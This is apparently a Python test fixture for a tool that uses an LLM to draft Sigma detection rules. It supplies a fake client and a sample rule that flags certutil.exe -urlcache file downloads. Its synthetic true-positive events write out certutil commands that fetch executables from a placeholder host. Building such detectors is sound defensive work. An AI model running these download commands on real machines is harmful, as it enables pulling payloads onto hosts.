"""A scripted stand-in for the Anthropic client. Tests and CI never need an API key."""

from __future__ import annotations

import copy
import json

from ringtail.llm import LLMError

EXTRACTION = {
    "behavior_summary": "certutil.exe used with -urlcache to download a file from a URL.",
    "log_source": {"product": "windows", "category": "process_creation", "service": ""},
    "key_fields": ["Image", "OriginalFileName", "CommandLine"],
    "candidate_techniques": ["T1105"],
    "notes": "",
}

RULE_YAML = r"""
title: Certutil Used to Download a File
id: 00000000-0000-0000-0000-000000000000
status: stable
author: someone the model made up
date: 1999-01-01
description: Detects certutil.exe with -urlcache, a common way to pull payloads onto a host.
references:
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command-and-control
  - attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\certutil.exe'
    - OriginalFileName: 'CertUtil.exe'
  selection_cli:
    CommandLine|contains|windash: '-urlcache'
  condition: all of selection_*
falsepositives:
  - Administrators refreshing certificate revocation lists by hand
level: high
"""

CERTUTIL = "C:\\Windows\\System32\\certutil.exe"


def ev(**kw) -> str:
    base = {"EventID": 1, "Computer": "WKSTN-EXAMPLE-01.example.local", "User": "EXAMPLE\\jdoe"}
    base.update(kw)
    return json.dumps(base)


GOOD_DRAFT = {
    "slug": "win_proc_certutil_download",
    "rule_yaml": RULE_YAML,
    "true_positive_events": [
        ev(_comment="dash form", Image=CERTUTIL, OriginalFileName="CertUtil.exe",
           CommandLine="certutil.exe -urlcache -split -f http://example.invalid/a.exe a.exe"),
        ev(_comment="slash form", Image=CERTUTIL, OriginalFileName="CertUtil.exe",
           CommandLine="certutil /urlcache /f http://example.invalid/b.txt b.txt"),
    ],
    "false_positive_events": [
        ev(_comment="near miss: certutil hashing a file", Image=CERTUTIL, OriginalFileName="CertUtil.exe",
           CommandLine="certutil.exe -hashfile C:\\Tools\\setup.exe SHA256"),
        ev(_comment="unrelated process", Image="C:\\Windows\\System32\\notepad.exe",
           OriginalFileName="NOTEPAD.EXE", CommandLine="notepad.exe notes.txt"),
    ],
    "card": {
        "goal": "Catch certutil being abused to download files.",
        "summary": "Fires when certutil runs with -urlcache.",
        "triage": ["Check the URL.", "Check the parent process.", "Hash the downloaded file."],
    },
    "notes": "",
}


def draft(**changes) -> dict:
    d = copy.deepcopy(GOOD_DRAFT)
    d.update(changes)
    return d


class FakeLLM:
    """Returns scripted replies in order. A reply that is an Exception is raised."""

    def __init__(self, extraction=None, drafts=None):
        self.extraction = extraction if extraction is not None else EXTRACTION
        self.drafts = list(drafts or [GOOD_DRAFT])
        self.calls: list[dict] = []
        self.usage: list[dict] = []

    def complete_json(self, system, user, schema, *, purpose):
        self.calls.append({"purpose": purpose, "system": system, "user": user, "schema": schema})
        reply = self.extraction if purpose == "extract" else (
            self.drafts.pop(0) if self.drafts else LLMError("fake: out of scripted drafts")
        )
        if isinstance(reply, Exception):
            raise reply
        return copy.deepcopy(reply)
